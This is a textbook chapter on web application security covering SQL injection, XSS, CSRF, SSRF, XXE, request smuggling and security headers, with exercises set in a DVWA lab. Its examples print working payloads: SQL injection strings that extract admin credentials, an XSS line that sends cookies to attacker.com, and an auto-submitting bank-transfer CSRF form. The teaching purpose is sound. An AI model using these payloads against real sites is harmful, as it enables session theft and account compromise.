# Web Security

## Learning Objectives

After completing this chapter, students will be able to identify and exploit SQL injection vulnerabilities across multiple variants, distinguish reflected, stored, and DOM-based XSS with appropriate defences, implement CSRF protections, understand SSRF and XXE attack vectors, configure security headers, recognise advanced web attacks including request smuggling and HTTP parameter pollution, and apply secure coding practices throughout the web application lifecycle.

## Theory

### SQL Injection

SQL injection occurs when untrusted input is concatenated into SQL queries without proper sanitisation. UNION-based injection appends a SELECT statement to the original query, retrieving data from other tables. Blind injection extracts data through true/false responses (boolean blind) or time delays (time-based). Error-based injection uses database error messages to infer structure. Stacked queries execute multiple statements. Prevention requires parameterised queries (prepared statements) that separate SQL code from data. Stored procedures and input validation provide additional layers.

### Cross-Site Scripting

XSS injects malicious scripts into web pages viewed by other users. Reflected XSS appears in the immediate response, often via crafted URLs or search parameters. Stored XSS persists on the server, such as in comments or forum posts, affecting every visitor. DOM-based XSS modifies the client-side DOM without server interaction using untrusted data in JavaScript execution sinks. Prevention includes output encoding (context-sensitive), Content Security Policy (CSP), input validation, and avoiding dangerous JavaScript functions such as `innerHTML` and `eval`.

### Cross-Site Request Forgery

CSRF forces an authenticated victim to execute unintended actions. The attacker crafts a request that appears legitimate, leveraging the victim's existing session. Synchroniser tokens (CSRF tokens) uniquely bind each request to the session. SameSite cookies restrict cookie attachment to same-site requests. Custom headers and double-submit cookies provide additional protection.

### Server-Side Request Forgery

SSRF occurs when an attacker controls the URL that a server fetches. The server may access internal resources (cloud metadata endpoints, internal services) that are not publicly accessible. Blind SSRF returns no direct response but may trigger out-of-band interactions. Implementation of allowlists for permitted URLs, disabling unused URL schemes, and network-level restrictions on outbound traffic mitigate SSRF.

### XML External Entities

XXE attacks exploit XML parsers that process external entities. Attackers can read local files, perform SSRF, or cause denial of service. Prevention includes disabling external entity processing entirely, using less complex data formats such as JSON, and patching XML parsers.

### HTTP Request Smuggling

Request smuggling exploits discrepancies between how front-end and back-end servers parse HTTP Content-Length and Transfer-Encoding headers. Attackers can poison caches, bypass security controls, or hijack user sessions. Defence requires consistent HTTP parsing, disabling reuse of backend connections, and using HTTP/2 where possible.

### Command Injection

Command injection executes arbitrary operating system commands by injecting shell metacharacters into application inputs. Input validation, parameterised APIs (avoiding shell execution), and least privilege for application processes are essential defences.

### Path Traversal

Path traversal reads files outside the web root by using sequences such as `../` within file paths. Canonicalisation of paths and strict allowlists for permitted files prevent this.

### HTTP Parameter Pollution

HTTP Parameter Pollution (HPP) sends multiple parameters with the same name, exploiting differences in how frameworks handle duplicates. The attacker may override legitimate parameters. Consistent parsing logic and rejecting duplicate parameters mitigate HPP.

### Session Hijacking

Session hijacking steals session tokens to impersonate users. Attack vectors include XSS (reading cookies), network sniffing (if cookies lack Secure flag), session fixation (forcing a known session ID), and token prediction. Defences include the HttpOnly and Secure cookie flags, using cryptographically random session identifiers, short session timeouts, and binding sessions to IP addresses or user-agent strings.

### Security Headers

Content-Security-Policy restricts resource sources, preventing XSS and data injection. HTTP Strict-Transport-Security (HSTS) enforces TLS connections. X-Frame-Options prevents clickjacking by controlling framing. X-Content-Type-Options (nosniff) prevents MIME-type sniffing. Referrer-Policy controls referrer header sending. Permissions-Policy restricts browser API access. Feature-Policy provides granular control over browser features.

## Examples

### SQL Injection Exploitation

A vulnerable query: `SELECT * FROM users WHERE username = '$username'`. Injecting `admin' OR '1'='1` produces `SELECT * FROM users WHERE username = 'admin' OR '1'='1'`, returning all users. UNION injection: `' UNION SELECT username, password FROM admins -- ` extracts credential data. Time-based blind: `' OR IF(SUBSTRING((SELECT db_name()),1,1)='m',SLEEP(5),0) -- `.

### XSS Payloads

Reflected XSS: `<script>alert('xss')</script>` embedded in a search parameter. Stored XSS: `<img src=x onerror=this.src='http://attacker.com/steal.php?c='+document.cookie>` in a comment field. DOM-based XSS: `document.write(location.hash.substring(1))` where `#<img src=x onerror=alert(1)>` is the fragment.

### CSRF Exploitation

An attacker crafts a hidden form targeting a bank transfer endpoint: `<form action="https://bank.com/transfer" method="POST"><input type="hidden" name="amount" value="1000"><input type="hidden" name="to" value="attacker"></form><script>document.forms[0].submit()</script>`. A SameSite=Lax cookie would prevent this cross-site request.

### Security Header Deployment

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com; object-src 'none'
X-Frame-Options: DENY
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: geolocation=(), camera=()
```

## Summary

Web security addresses vulnerabilities arising from the complexity of HTTP, browsers, and server-side processing. The OWASP Top 10 provides a prioritised taxonomy. SQL injection, XSS, and CSRF remain the most prevalent vulnerabilities despite well-documented defences. Modern security headers and CSP provide robust protection when properly configured. Secure development practices, including input validation, output encoding, and parameterised queries, must be integrated throughout the software development lifecycle.

## Exercises

### Review Questions

1. Explain why parameterised queries prevent SQL injection while input filtering alone does not. Reference SQL query compilation stages.
2. Distinguish reflected, stored, and DOM-based XSS. Which type is most difficult to detect with server-side security tools?
3. How does a SameSite=Strict cookie prevent CSRF attacks? What usability trade-off does it introduce?
4. Describe an attack scenario where SSRF is used to compromise cloud infrastructure. What AWS metadata endpoints are commonly targeted?
5. List and describe six HTTP security headers. What attack does each prevent?

### Application Problems

1. Deploy DVWA (Damn Vulnerable Web Application). Exploit SQL injection in the user ID field to extract the complete users table. Use UNION injection to read database version, current user, and all table names.
2. Create a stored XSS payload that steals session cookies and sends them to a listener. Implement a Content-Security-Policy that would have prevented your payload from executing.
3. Configure Burp Suite to intercept and modify HTTP requests. Demonstrate CSRF token bypass by writing a script that predicts or reuses a token. Then implement the SameSite defence and verify it blocks the attack.

### Challenge Problem

Build a secure web application with user registration, authentication, and a comment system. The application must be resistant to SQL injection (use parameterised queries), XSS (implement CSP and context-sensitive output encoding), CSRF (use synchroniser tokens with SameSite cookies), and SSRF (validate and allowlist fetch targets). Document each defensive control with reference to the vulnerability it addresses. Then swap with a classmate and attempt to find vulnerabilities in each other's applications.
